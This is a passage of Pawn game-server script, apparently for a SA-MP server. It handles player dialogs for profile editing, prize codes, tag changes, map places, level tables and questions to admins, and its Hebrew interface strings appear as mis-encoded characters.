							getdate(today[2],today[1],today[0]);
							for(new i = 0; i < 3; i++) d[i] = strval(strtok(inputtext,idx,'/'));
							if(!IsValidDate(d[0],d[1],d[2]) || d[2] < 1970 || d[2] > today[2]-3) err = ".ф·р°щъ ∙фхўьу ьр ўщщэ рх ьр рЇ∙°щ";
							else
							{
								for(new i = 0; i < 3; i++) playerinfo[playerid][birthdate][i] = d[i];
								fsetint(fuser(playerid),"ProfileBirthDay",playerinfo[playerid][birthdate][0]);
								fsetint(fuser(playerid),"ProfileBirthMonth",playerinfo[playerid][birthdate][1]);
								fsetint(fuser(playerid),"ProfileBirthYear",playerinfo[playerid][birthdate][2]);
							}
						}
					}
				}
				/*case 3:
				{
					enterwhat = "юёЇ° фрщщёщўщх";
					if(none)
					{
						playerinfo[playerid][icq] = 0;
						fsetint(fuser(playerid),"ProfileICQ",0);
					}
					else
					{
						if(!IsNumeric(inputtext)) err = ".Єьщъ ьфўьщу юёЇ°";
						else if(strlen(inputtext) < 5 || strlen(inputtext) > 9) err = ".рх°ъ юёЇ° фрщщёщўщх ∙тхщ";
						else
						{
							playerinfo[playerid][icq] = strval(inputtext);
							fsetint(fuser(playerid),"ProfileICQ",playerinfo[playerid][icq]);
						}
					}
				}
				case 4:
				{
					enterwhat = "ы·хс· фюёЁт'°";
					if(none)
					{
						format(playerinfo[playerid][messenger],30,"None");
						fsetstring(fuser(playerid),"ProfileMessenger","None");
					}
					else
					{
						if(strlen(inputtext) < 6 || strlen(inputtext) > 30) err = ".рх°ъ фы·хс· ∙тхщ";
						else if(charcount(inputtext,'@') != 1 || charcount(inputtext,'.') < 1 || charcount(inputtext,'.') > 2) err = ".ы·хс· ьр чхўщ·";
						else
						{
							format(playerinfo[playerid][messenger],30,inputtext);
							fsetstring(fuser(playerid),"ProfileMessenger",playerinfo[playerid][messenger]);
						}
					}
				}*/
				case 3:
				{
					enterwhat = "∙э фёўщщЇ";
					if(none)
					{
						format(playerinfo[playerid][skype],30,"None");
						fsetstring(fuser(playerid),"ProfileSkype","None");
					}
					else
					{
						if(strlen(inputtext) < 2 || strlen(inputtext) > 25) err = ".рх°ъ ф∙э ∙тхщ";
						else
						{
							format(playerinfo[playerid][skype],30,inputtext);
							fsetstring(fuser(playerid),"ProfileSkype",playerinfo[playerid][skype]);
						}
					}
				}
				case 4:
				{
					enterwhat = "ф∙э сЇщщёсхў";
					if(none)
					{
						format(playerinfo[playerid][facebook],30,"None");
						fsetstring(fuser(playerid),"ProfileFacebook","None");
					}
					else
					{
						if(strlen(inputtext) < 2 || strlen(inputtext) > 25) err = ".рх°ъ ф∙э ∙тхщ";
						else
						{
							format(playerinfo[playerid][facebook],30,inputtext);
							fsetstring(fuser(playerid),"ProfileFacebook",playerinfo[playerid][facebook]);
						}
					}
				}
				case 5:
				{
					enterwhat = "ы·хс· фющщь";
					if(none)
					{
						format(playerinfo[playerid][email],30,"None");
						fsetstring(fuser(playerid),"ProfileEmail","None");
					}
					else
					{
						if(strlen(inputtext) < 6 || strlen(inputtext) > 30) err = ".рх°ъ фы·хс· ∙тхщ";
						else if(charcount(inputtext,'@') != 1 || charcount(inputtext,'.') < 1 || charcount(inputtext,'.') > 2) err = ".ы·хс· ьр чхўщ·";
						else
						{
							format(playerinfo[playerid][email],30,inputtext);
							fsetstring(fuser(playerid),"ProfileEmail",playerinfo[playerid][email]);
						}
					}
				}
			}
			if(none) format(string,sizeof(string),@c(green) "!юЄы∙щх ьр ·хЎт ∙х°ф сЇ°хЇщь ∙ь %s ∙ьъ",enterwhat);
			else if(strlen(err) > 0) format(string,sizeof(string),@c(red) "%s",err);
			else format(string,sizeof(string),@c(green) ":%s ∙ьъ ЁЄ°ъ сфЎьчф ь\n" @c(lightgreen) "%s",enterwhat,inputtext);
			ShowPlayerDialog(playerid,dialog_editprofile3,DIALOG_STYLE_MSGBOX,@c(lightblue) "Є°щы· Ї°хЇщь",string,"чцх°","щЎщрф");
		} else command(playerid,"/profile edit");
		case dialog_editprofile3: if(response) command(playerid,"/profile edit");
		case dialog_mode: if(response)
		{
			if(IsNumeric(inputtext) && strlen(inputtext) > 0)
			{
				new n = IsNumeric(inputtext) ? strval(inputtext) : ModeHelpFromName(inputtext);
				if(n < 1 || n > numOfHelpModes)
				{
					format(string,sizeof(string),@c(red) ".Єьщъ ьфўьщу юёЇ° ·Ї°щш Єц°ф ·ўщя сщя " @c(lightred) "1" @c(red) " ь-" @c(lightred) "%d",numOfHelpModes);
					return ShowPlayerDialog(playerid,dialog_modehelpmenu,DIALOG_STYLE_MSGBOX,@c(lightblue) "Mode",@c(red) ".Єьщъ ьфўьщу юёЇ° ·Ї°щш Єц°ф","чцх°","щЎщрф");
				}
				ShowModeHelp(playerid,n);
			}
			else ShowPlayerDialog(playerid,dialog_modehelpmenu,DIALOG_STYLE_MSGBOX,@c(lightblue) "Mode",@c(red) ".Єьщъ ьфўьщу юёЇ° ·Ї°щш Єц°ф","чцх°","щЎщрф");
		}
		case dialog_modehelpmenu: if(response) ShowPlayerConstDialog(playerid,dialog_mode);
		case dialog_code: ShowPlayerConstDialog(playerid,dialog_code2);
		case dialog_code2:
		{
			playerinfo[playerid][clickon] = listitem+1;
			switch(listitem)
			{
				case 0: // use
				{
					new pCode = CallRemoteFunction("GetPlayerPrize","i",playerid), pC[32];
					format(string,sizeof(string),@c(green) "?фрэ р·ф сшхч ∙с°ЎхЁъ ьр∙° р· фўху хьўсь р· фЇ°ё");
					if(pCode > 0 && Codes[playerinfo[playerid][pcode][0]][cdSID] > 0 && Codes[playerinfo[playerid][pcode][0]][cdSID] != pCode)
					{
						for(new i = 1; i < sizeof(Codes) && !strlen(pC); i++) if(Codes[i][cdSID] == pCode) format(pC,sizeof(pC),Codes[i][cdName]);
						format(string,sizeof(string),"%s\n\n" @c(red) "!(%s) щючў хщхчьє сўху фчу∙ (%s) ∙щэ ьс ыщ фўху ∙щ∙ ьъ ы°тЄ",string,Codes[playerinfo[playerid][pcode][0]][cdName],pC);
					}
					ShowPlayerDialog(playerid,dialog_codeaccept,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўху",string,"рщ∙х°","чцх°");
				}
				case 1: // transfer
				{
					ShowPlayerDialog(playerid,dialog_codeaccept,DIALOG_STYLE_INPUT,@c(lightblue) "ўху",@c(green) ":°∙хэ ыря р· фрщщущ рх р· фыщЁхщ ∙ь ф∙чўя ∙р·ф °хЎф ьфЄсщ° рьщх р· фўху","фЄс°ф","чцх°");
				}
				case 2: // delete
				{
					ShowPlayerDialog(playerid,dialog_codeaccept,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўху",@c(red) "?фрэ р·ф сшхч ∙с°ЎхЁъ ьючхў р· фўху\n!∙щэ ьс ыщ ьр щфщф Ёщ·я ьф∙·ю∙ сх щх·° ьрч° ∙·ючў рх·х","ючщўф","чцх°");
				}
			}
		}
		case dialog_codeaccept:
		{
			if(response)
			{
				switch(playerinfo[playerid][clickon])
				{
					case 1: // use
					{
						if(Codes[playerinfo[playerid][pcode][0]][cdSID] > 0)
						{
							CallRemoteFunction("SetPlayerPrize","iii",playerid,Codes[playerinfo[playerid][pcode][0]][cdSID],playerinfo[playerid][pcode][1]);
							playerinfo[playerid][playerprize] = Codes[playerinfo[playerid][pcode][0]][cdSID];
							format(string,sizeof(string)," ╗ :щфщф ЇЄщь рЎьъ ь %d щющэ %s фўху",playerinfo[playerid][pcode][1],Codes[playerinfo[playerid][pcode][0]][cdName]);
							SendClientMessage(playerid,lightblue,string);
							switch(Codes[playerinfo[playerid][pcode][0]][cdSID])
							{
								case 1:
								{
									SendClientMessage(playerid,yellow," !ўху цф юрЇ∙° ьъ ьёхЄ сюыхЁщх· хрхЇЁхЄщэ сюфщ°х·");
									SendClientMessage(playerid,yellow," .хф°ыс ∙ьъ щщёЄ юф° щх·° ~k~~VEHICLE_FIREWEAPON~ ьчї Єь фюў∙");
									SendClientMessage(playerid,red," * ўху цф ьр ЇЄщь сющ°хЎщэ");
								}
								case 2:
								{
									SendClientMessage(playerid,yellow," !ўху цф юрЇ∙° ьъ ьўЇхї Єэ ф°ыс ∙ьъ сыь 5 ∙Ёщх·");
									SendClientMessage(playerid,yellow," .хф°ыс ∙ьъ щўЇхї ·хъ ыущ фЁёщЄф ~k~~VEHICLE_FIREWEAPON~ ьчї Єь фюў∙");
								}
								case 3:
								{
									SendClientMessage(playerid,yellow," !ўху цф юрЇ∙° ьъ ьфчьщє р· фЎсЄщэ ∙ьъ сюфщ°х· хьсьсь р· фщ°щс");
									SendClientMessage(playerid,yellow," .ыущ ьфЇЄщь рх ьсшь р· фчьЇ· фЎсЄщэ /rndcol ф∙·ю∙ сЇўхуф");
								}
								case 4:
								{
									SendClientMessage(playerid,yellow," !ўху цф юрЇ∙° ьъ ььы· Єь фющэ");
									SendClientMessage(playerid,yellow," .ыущ ьфЇЄщь рх ьсшь р· ффьщыф Єь фющэ /waterwalk ф∙·ю∙ сЇўхуф");
								}
								case 5:
								{
									SendClientMessage(playerid,yellow," !ўху цф юрЇ∙° ьъ ьр ьщЇхь юфрхЇЁхЄ тэ рэ р·ф ю·Ёт∙ сус°щэ");
									SendClientMessage(playerid,yellow," .ыущ ьфЇЄщь рх ьсшь р· фўху /abf ф∙·ю∙ сЇўхуф");
								}
								case 6:
								{
									SendClientMessage(playerid,yellow," !ўху цф юрЇ∙° ьъ ьфхёщє ьщщц° ь°хсф ∙ьъ");
									SendClientMessage(playerid,yellow," .ыущ ьфЇЄщь рх ьсшь р· фьщщц° /laser ф∙·ю∙ сЇўхуф");
								}
								case 7:
								{
									SendClientMessage(playerid,yellow," !ўху цф юрЇ∙° ьъ ьфхёщє ютя ю∙ш°·щ ∙щтя Єьщъ ючьў юфщ°щх·");
									SendClientMessage(playerid,yellow," .ыущ ьфЇЄщь рх ьсшь р· фютя /shield ф∙·ю∙ сЇўхуф");
								}
								case 8:
								{
									SendClientMessage(playerid,yellow," !ўху цф юрЇ∙° ьъ ьўЇхї тсхф щх·° юсу°ъ ыьь");
									SendClientMessage(playerid,yellow," .ыущ ьфЇЄщь рх ьсшь р· фўЇщЎф фтсхфф /superjump ф∙·ю∙ сЇўхуф");
								}
								case 9:
								{
									SendClientMessage(playerid,yellow," !ўху цф юрЇ∙° ьъ ьёхЄ Єь фющэ Єэ юыхЁщ·");
									SendClientMessage(playerid,yellow," .ыущ ьфЇЄщь рх ьсшь р· фЁёщЄф Єь фющэ /waterdrive ф∙·ю∙ сЇўхуф");
								}
								case 10:
								{
									SendClientMessage(playerid,yellow," !ўху цф юрЇ∙° ьъ ь∙Ёх· р· ·Ўхт· ф°ысщэ ∙ьъ ьсь·щ Ё°рщэ");
									SendClientMessage(playerid,yellow," .ыущ ьфЇЄщь рх ьсшь р· ф·Ўхтф /invcars ф∙·ю∙ сЇўхуф");
								}
								case 11:
								{
									SendClientMessage(playerid,yellow," !ўху цф юрЇ∙° ьъ ььы· ср∙ юсьщ ьфЇтЄ");
									SendClientMessage(playerid,yellow," .ыущ ьфЇЄщь рх ьсшь р· ффтЁф юр∙ /fireproof ф∙·ю∙ сЇўхуф");
								}
								case 12:
								{
									SendClientMessage(playerid,yellow," !ўху цф юрЇ∙° ьъ ьўсхЄ р· фю°чў сщЁъ ьсщя фюЎьюф ∙ь фю∙чў");
									SendClientMessage(playerid,yellow," .ыущ ь∙Ёх· р· фю°чў /cam ф∙·ю∙ сЇўхуф");
								}
							}
						}
						else
						{
							switch(playerinfo[playerid][pcode][0])
							{
								case 1: /* Money */
								{
									GiveMoney(playerid,playerinfo[playerid][pcode][1], 43);
									format(string,sizeof(string)," !ўщсь· $%d юфўху",playerinfo[playerid][pcode][1]);
								}
								case 2: /* Bank Money */
								{
									UpdateBank(GetName(playerid)," ўщсь· ыёє юўху",playerinfo[playerid][pcode][1]);
									if(playerinfo[playerid][logged])
									{
										new str[M_S];
										format(str, sizeof(str), "earned %d (code)", playerinfo[playerid][pcode][1]);
										Log("Money", playerid, str);
										fsetint(fuser(playerid),"Bank",playerinfo[playerid][bank]);
									}
									format(string,sizeof(string)," !ўщсь· $%d юфўху, фэ ЁюЎрщэ ссЁў ∙ьъ",playerinfo[playerid][pcode][1]);
								}
								case 3: /* Kills */
								{
									playerinfo[playerid][kills] += playerinfo[playerid][pcode][1];
									if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Kills",playerinfo[playerid][kills]);
									format(string,sizeof(string)," !ўщсь· %d ф°щтх· юфўху",playerinfo[playerid][pcode][1]);
								}
								case 4: /* Weapons */
								{
									GiveWeapon(playerid,9,0);
									GiveWeapon(playerid,16,10000);
									GiveWeapon(playerid,24,10000);
									GiveWeapon(playerid,26,10000);
									GiveWeapon(playerid,28,10000);
									GiveWeapon(playerid,31,10000);
									GiveWeapon(playerid,34,10000);
									GiveWeapon(playerid,35,10000);
									format(string,sizeof(string)," !ўщсь· р· ыь фЁ∙ўщэ фыщ шхсщэ юфўху");
								}
								case 5: /* Energy */
								{
									AddEnergy(playerid,playerinfo[playerid][pcode][1]);
									format(string,sizeof(string)," (ўщсь· %d рЁ°тщф юфўху! (рЁ°тщф ю∙ю∙· ьыхчх· рхьшщюшщсщщэ",playerinfo[playerid][pcode][1]);
								}
								case 6: /* Tag Change */ ShowPlayerDialog(playerid,dialog_tagchange,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ ·рт",@c(green) ".сч° ·рт чу∙ ∙·ўсь сцых· фўху\n\n(ьчї ∙щЁхщ ьЄ°щы· ф·рт (°∙хэ с∙уф фы·щсф ·х рчу рх Їчх· ьфё°· ·рт ўщщэ\nьчї сщшхь ыущ ьф∙рщ° р· ф·рт ььр ∙щЁхщ","∙щЁхщ","сщшхь");
								case 7: /* Level Name Change */ ShowPlayerDialog(playerid,dialog_levelnamechange,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ ∙э °юф",@c(green) ".сч° ∙э °юф чу∙ф ∙·ўсь сцых· фўху\n\n(ьчї ∙щЁхщ ьЄ°щы· ∙э ф°юф (ф∙р° р· ∙уф фы·щсф °щў ьфё°· ∙э ф°юф фўщщэ\nьчї сщшхь ыущ ьф∙рщ° р· ∙э ф°юф ььр ∙щЁхщ","∙щЁхщ","сщшхь");
								case 8: /* Slap Access */
								{
									playerinfo[playerid][access][0] = playerinfo[playerid][pcode][1];
									format(string,sizeof(string)," /slap :ўщсь· тщ∙ф ь %d ёьрЇщэ юфўху! ыущ ь·· ёьрЇ ф∙·ю∙ сЇўхуф",playerinfo[playerid][pcode][1]);
								}
								case 9: /* Poke Access */
								{
									playerinfo[playerid][access][1] = playerinfo[playerid][pcode][1];
									format(string,sizeof(string)," /poke :ўщсь· тщ∙ф ь %d Їхўщэ юфўху! ыущ ь·· Їхў ф∙·ю∙ сЇўхуф",playerinfo[playerid][pcode][1]);
								}
							}
							SendClientMessage(playerid,green,string);
						}
						format(string,sizeof(string),"used code of %d %s",playerinfo[playerid][pcode][1],Codes[playerinfo[playerid][pcode][0]][cdName]);
						Log("Attention",playerid,string);
						if(playerinfo[playerid][pcode][3] == INVALID_PLAYER_ID)
						{
							if(playerinfo[playerid][pcode][1] > 0) format(string,sizeof(string)," ╗ [%s: %d] !" @c(lightgreen) "\"%s\"" @c(green) " ,ющю∙ ыЄ· р· фўху ∙цыф сх %s л",Codes[playerinfo[playerid][pcode][0]][cdSID] > 0 ? ("юёЇ° щющэ") : ("ыюх·"),playerinfo[playerid][pcode][1],GetName(playerinfo[playerid][pcode][2]),Codes[playerinfo[playerid][pcode][0]][cdName],GetName(playerid));
							else format(string,sizeof(string)," ╗ !" @c(lightgreen) "\"%s\"" @c(green) " ,ющю∙ ыЄ· р· фўху ∙цыф сх %s л",GetName(playerinfo[playerid][pcode][2]),Codes[playerinfo[playerid][pcode][0]][cdName],GetName(playerid));
						}
						else
						{
							if(playerinfo[playerid][pcode][1] > 0) format(string,sizeof(string)," ╗ [%s: %d] !%s-∙фхЄс° рьщх ю " @c(lightgreen) "\"%s\"" @c(green) " ф∙·ю∙ сўху %s л",Codes[playerinfo[playerid][pcode][0]][cdSID] > 0 ? ("юёЇ° щющэ") : ("ыюх·"),playerinfo[playerid][pcode][1],GetName(playerinfo[playerid][pcode][2]),Codes[playerinfo[playerid][pcode][0]][cdName],GetName(playerid));
							else format(string,sizeof(string)," ╗ !%s-∙фхЄс° рьщх ю " @c(lightgreen) "\"%s\"" @c(green) " ф∙·ю∙ сўху %s л",GetName(playerinfo[playerid][pcode][2]),Codes[playerinfo[playerid][pcode][0]][cdName],GetName(playerid));
						}
						SendClientMessageToAll(green,string);
						playerinfo[playerid][pcode][0] = 0, playerinfo[playerid][pcode][1] = 0, playerinfo[playerid][pcode][2] = 0, playerinfo[playerid][pcode][2] = INVALID_PLAYER_ID;
					}
					case 2: // transfer
					{
						if(!strlen(inputtext)) ShowPlayerDialog(playerid,dialog_codeerror,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўху",@c(red) ".Єьщъ ь°∙хэ рщщущ рх ыщЁхщ ∙ь ∙чўя рч° ьфЄс°· фўху","чцх°","сщшхь");
						else
						{
							new id = ReturnUser(inputtext,playerid), dia[350];
							if(!IsPlayerConnected(id)) return ShowPlayerDialog(playerid,dialog_codeerror,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўху",@c(red) ".Єьщъ ь°∙хэ рщщущ рх ыщЁхщ ·ўщЁщэ ∙ь ∙чўя ∙ЁюЎр с∙°·","чцх°","сщшхь");
							if(id == playerid) return ShowPlayerDialog(playerid,dialog_codeerror,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўху",@c(red) ".ф∙·ю∙ с·Ї°щш фўхуэ ыущ ьф∙·ю∙ сўху сЄЎюъ","чцх°","сщшхь");
							playerinfo[id][pcode][0] = playerinfo[playerid][pcode][0];
							playerinfo[id][pcode][1] = playerinfo[playerid][pcode][1];
							playerinfo[id][pcode][2] = playerid;
							new pCode = CallRemoteFunction("GetPlayerPrize","i",playerid);
							format(dia,sizeof(dia),@c(green) "%s :сч° ьфЄсщ° рьщъ р· фўху ∙ўщсь, юёхт %s",Codes[playerinfo[playerid][pcode][0]][cdName],GetName(playerid));
							if(playerinfo[playerid][pcode][1] > 0)
							{
								if(Codes[playerinfo[playerid][pcode][0]][cdSID] > 0) format(dia,sizeof(dia),"%s\n[юёЇ° щющэ: %d]",dia,playerinfo[playerid][pcode][1]);
								else format(dia,sizeof(dia),"%s\n[ыюх· юхё·°·]",dia);
							}
							format(dia,sizeof(dia),"%s\n\n" @c(lightblue) ":·хыь ьсЎЄ юёЇ° ЇЄхьх· ы°тЄ",dia);
							format(dia,sizeof(dia),"%s\n\n" @c(yellow) "Х ьф∙·ю∙ сўху - ьўсь р· юф ∙фхр юрЇ∙°",dia);
							format(dia,sizeof(dia),"%s\nХ ьц°хў р· фўху - ьсшь р· фЇ°ё ∙ьх, ьр юхюьї",dia);
							format(dia,sizeof(dia),"%s\nХ ьфЄсщ° р· фўху ь∙чўя рч° - ьсчх° ∙чўя ∙щўсь ююъ р· фўху",dia);
							if(pCode > 0 && Codes[playerinfo[playerid][pcode][0]][cdSID] > 0) format(dia,sizeof(dia),"%s" @c(red) "\n\n∙щэ ьс! щ∙ ьъ ыс° ўху. рэ ·сч° ьф∙·ю∙ сўху, фўху фўхуэ ∙ьъ щхчьє счу∙",dia);
							format(dia,sizeof(dia),"%s\n\n" @c(pink) "...\"ыущ ьсчх° ЇЄхьф ьчї Єь \"фю∙ъ",dia);
							ShowPlayerDialog(id,dialog_code,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўху",dia,"фю∙ъ","");
							playerinfo[playerid][pcode][0] = 0, playerinfo[playerid][pcode][1] = 0, playerinfo[playerid][pcode][2] = 0, playerinfo[playerid][pcode][2] = INVALID_PLAYER_ID;
						}
					}
					case 3: // delete
					{
						playerinfo[playerid][pcode][0] = 0, playerinfo[playerid][pcode][1] = 0, playerinfo[playerid][pcode][2] = 0, playerinfo[playerid][pcode][2] = INVALID_PLAYER_ID;
						SendClientMessage(playerid,green," .фўху Ёючў сфЎьчф");
					}
				}
			}
			else ShowPlayerConstDialog(playerid,dialog_code2);
		}
		case dialog_codeerror:
		{
			if(response) ShowPlayerDialog(playerid,dialog_codeaccept,DIALOG_STYLE_INPUT,@c(lightblue) "ўху",@c(green) ":°∙хэ ыря р· фрщщущ рх р· фыщЁхщ ∙ь ф∙чўя ∙р·ф °хЎф ьфЄсщ° рьщх р· фўху","фЄс°ф","чцх°");
			else ShowPlayerConstDialog(playerid,dialog_code2);
		}
		case dialog_tagchange: if(response)
		{
			if(strlen(inputtext) > 12) return ShowPlayerDialog(playerid,dialog_tagchange,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ ·рт",@c(green) ".ф·рт р°хъ юущ, сч° рч°","∙щЁхщ","сщшхь");
			if(!strlen(inputtext))
			{
				format(playerinfo[playerid][tag],32,"x");
				if(playerinfo[playerid][logged]) fsetstring(fuser(playerid),"Tag2","x");
			}
			else
			{
				format(playerinfo[playerid][tag],32,inputtext);
				if(playerinfo[playerid][logged]) fsetstring(fuser(playerid),"Tag2",inputtext);
			}
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ·рт",@c(green) "!ф·рт ∙хЁф сфЎьчф","OK","");
		}
		case dialog_levelnamechange: if(response)
		{
			if(strlen(inputtext) > 12) return ShowPlayerDialog(playerid,dialog_levelnamechange,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ ·рт",@c(green) ".∙э ф°юф р°хъ юущ, сч° рч°","∙щЁхщ","сщшхь");
			if(!strlen(inputtext))
			{
				format(playerinfo[playerid][slevelname],64,"x");
				if(playerinfo[playerid][logged]) fsetstring(fuser(playerid),"PlayerLevelName","x");
			}
			else
			{
				format(playerinfo[playerid][slevelname],64,inputtext);
				if(playerinfo[playerid][logged]) fsetstring(fuser(playerid),"PlayerLevelName",inputtext);
			}
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ∙э °юф",@c(green) "!∙э ф°юф ∙хЁф сфЎьчф","OK","");
		}
		case dialog_places: if(response)
		{
			playerinfo[playerid][clickon] = listitem;
			ShowPlayerConstDialog(playerid,dialog_places2);
		}
		case dialog_places2:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0: // info
					{
						new dia[256];
						format(dia,sizeof(dia),@c(yellow) ":∙э фюўхэ\n" @c(white) "%s",placeinfo[playerinfo[playerid][clickon]][plName]);
						format(dia,sizeof(dia),"%s\n" @c(yellow) ":·щрх°\n" @c(white) "%s",dia,placeinfo[playerinfo[playerid][clickon]][plText]);
						if(!equal(placeinfo[playerinfo[playerid][clickon]][plCMD],"X")) format(dia,sizeof(dia),"%s\n" @c(yellow) ":Їўху· ∙щтх°\n" @c(white) "%s",dia,placeinfo[playerinfo[playerid][clickon]][plCMD]);
						ShowPlayerDialog(playerid,dialog_placeinfo,DIALOG_STYLE_MSGBOX,@c(lightblue) "юўхюх·",dia,"чцх°","");
					}
					case 1: // mark on map
					{
						SetPlayerMapIcon(playerid,icon_place,placeinfo[playerinfo[playerid][clickon]][plPos][0],placeinfo[playerinfo[playerid][clickon]][plPos][1],placeinfo[playerinfo[playerid][clickon]][plPos][2],41,0,MAPICON_GLOBAL);
						ShowPlayerDialog(playerid,dialog_placeinfo,DIALOG_STYLE_MSGBOX,@c(lightblue) "юўхюх·",@c(green) "!фюўхэ ∙сч°· ы°тЄ юёхюя сюЇф","чцх°","щЎщрф");
						playerinfo[playerid][usedfind] = 1;
					}
					case 2: // remove mark
					{
						if(!playerinfo[playerid][usedfind]) return ShowPlayerDialog(playerid,dialog_placeinfo,DIALOG_STYLE_MSGBOX,@c(lightblue) "юўхюх·",@c(red) ".рщя ёщюхя сюЇф","чцх°","щЎщрф");
						RemovePlayerMapIcon(playerid,icon_place);
						ShowPlayerDialog(playerid,dialog_placeinfo,DIALOG_STYLE_MSGBOX,@c(lightblue) "юўхюх·",@c(green) "!фёщюхя сюЇф фхё°","чцх°","щЎщрф");
					}
				}
			}
			else command(playerid,"/find");
		}
		case dialog_placeinfo: if(response) ShowPlayerConstDialog(playerid,dialog_places2);
		case dialog_levels: if(response)
		{
			new dia[1024], header[64];
			switch(listitem)
			{
				case 0:
				{
					header = "ыюх· фф°щтх· ∙у°х∙х· ьыь °юф", dia = @h(FF0000);
					for(new i = 1; i < sizeof(levels); i++) format(dia,sizeof(dia),"%s\nLevel %d:\t%d Kills",dia,i,levels[i][NeedKills]);
				}
				case 1:
				{
					header = "чщщэ хютя ю·юьрщэ ьрч° ф°щтф", dia = @h(FF8000);
					for(new i = 1; i < sizeof(levels); i++) format(dia,sizeof(dia),"%s\nLevel %d:\tHealth - %.1f Х Armour - %.1f",dia,i,levels[i][DeathHealth],levels[i][DeathArmour]);
				}
				case 2:
				{
					header = "ютсь· ыёє ссЁў", dia = @h(FFFF00);
					for(new i = 1; i < sizeof(levels); i++) if(!levels[i][BankLimit]) format(dia,sizeof(dia),"%s\nLevel %d:\tрщя ютсьф",dia,i); else format(dia,sizeof(dia),"%s\nLevel %d:\t$%d",dia,i,levels[i][BankLimit]);
				}
				case 3:
				{
					header = "ютсь· ыух°щэ ьЁ∙ў", dia = @h(008000);
					for(new i = 1; i < sizeof(levels); i++) if(!levels[i][AmmoLimit]) format(dia,sizeof(dia),"%s\nLevel %d:\tрщя ютсьф",dia,i); else format(dia,sizeof(dia),"%s\nLevel %d:\t%d",dia,i,levels[i][AmmoLimit]);
				}
				case 4:
				{
					header = "ютсь· рЁ°тщф", dia = @h(0000FF);
					for(new i = 1; i < sizeof(levels); i++) format(dia,sizeof(dia),"%s\nLevel %d:\t%d",dia,i,levels[i][EnergyLimit]);
				}
			}
			format(header,sizeof(header),@c(lightblue) "%s",header);
			ShowPlayerDialog(playerid,dialog_levels2,DIALOG_STYLE_MSGBOX,header,dia,"чцх°","щЎщрф");
		}
		case dialog_levels2: if(response) command(playerid,"/levels");
		case dialog_question: if(response)
		{
			if(strlen(inputtext) > 120) return ShowPlayerDialog(playerid,dialog_question,DIALOG_STYLE_INPUT,@c(lightblue) "?",@c(red) ":ф∙рьф ∙∙ьч· р°хыф юущ, Ёёф ьўЎ°","∙ьч","сщшхь");
			if(IsEmpty(inputtext)) return ShowPlayerDialog(playerid,dialog_question,DIALOG_STYLE_INPUT,@c(lightblue) "?",@c(red) ":ьр фўьу· ∙рьф! Ёёф ∙хс","∙ьч","сщшхь");
			if(playerinfo[playerid][answeredby] == INVALID_PLAYER_ID)
			{
				new admins = 0;
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && ((IsPlayerMAdmin(i) && playerinfo[i][showme]) || PlayerHasRank(i,RankID("Ўхх· ф∙°·")))) admins++;
				if(!admins) return ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "?",@c(red) ".рщя рч°рщ ·ющыф ючхс°щэ хьыя ф∙рьф ьр Ё∙ьчф","OK","");
				format(string,sizeof(string)," (/ans %d [text] ∙ьч ∙рьф: (ьюЄЁф %s (%d)",playerid,GetName(playerid),playerid);
				for(new a = 0; a < MAX_PLAYERS_; a++) if(IsPlayerConnected(a) && (IsPlayerMAdmin(a) || PlayerHasRank(a,RankID("Ўхх· ф∙°·"))))
				{
					SendClientMessage(a,darkred,string);
					SendClientMessage(a,red,inputtext);
				}
				ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "?",@c(green) "!ф∙рьф ∙ьъ Ё∙ьчф сфЎьчф рь фрующЁщэ хЎхх· ф·ющыф\n.р·ф щыхь ьфю∙щъ ь∙чў, Ё∙·уь ьЄЁх· ьъ сфўуэ","OK","");
			}
			else
			{
				format(string,sizeof(string)," (/ans %d [text] ю∙щс рьщъ фхуЄф ьрч° ф∙рьф: (ьюЄЁф %s (%d)",playerid,GetName(playerid),playerid);
				SendClientMessage(playerinfo[playerid][answeredby],darkred,string);
				SendClientMessage(playerinfo[playerid][answeredby],red,inputtext);
				ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "?",@c(green) "!ффхуЄф ∙ф∙с· Ё∙ьчф сфЎьчф","OK","");
			}
			format(playerinfo[playerid][question],128,inputtext);
		}
		case dialog_answer: if(response) ShowPlayerDialog(playerid,dialog_question,DIALOG_STYLE_INPUT,@c(lightblue) "?",@c(green) ":фўьу ыря р· фшўёш ∙с°ЎхЁъ ь∙ьхч ью∙·ю∙ ∙ЄЁф Єь ф∙рьф ∙ьъ","∙ьч","сщшхь");
		case dialog_admintotal: if(response)
		{
			if(strlen(AdminAbilities[listitem][aaParam]) > 0)
			{
				playerinfo[playerid][clickon] = listitem;
				format(string,sizeof(string),@c(green) " :Ёр ьфўьщу ыря р· " @c(lightgreen) "%s",AdminAbilities[listitem][aaParam]);
				ShowPlayerDialog(playerid,dialog_admintotal2,DIALOG_STYLE_INPUT,@c(lightblue) "рЇ∙°хщх· ыхььх·",string,"сщЎхЄ","чцх°");
			}
			else
			{
				UseAdminAbility(playerid,listitem,.targetid=playerinfo[playerid][clickplayer]);
				ShowPlayerConstDialog(playerid,dialog_admintotal);
			}
		}
		case dialog_admintotal2:
		{
			if(response)
			{
				if(!IsNumeric(inputtext))
				{
					format(string,sizeof(string),@c(red) ".шЄщ· сфўьуф\n" @c(green) " :Ёр ьфўьщу ыря р· " @c(lightgreen) "%s",AdminAbilities[playerinfo[playerid][clickplayer]][aaParam]);
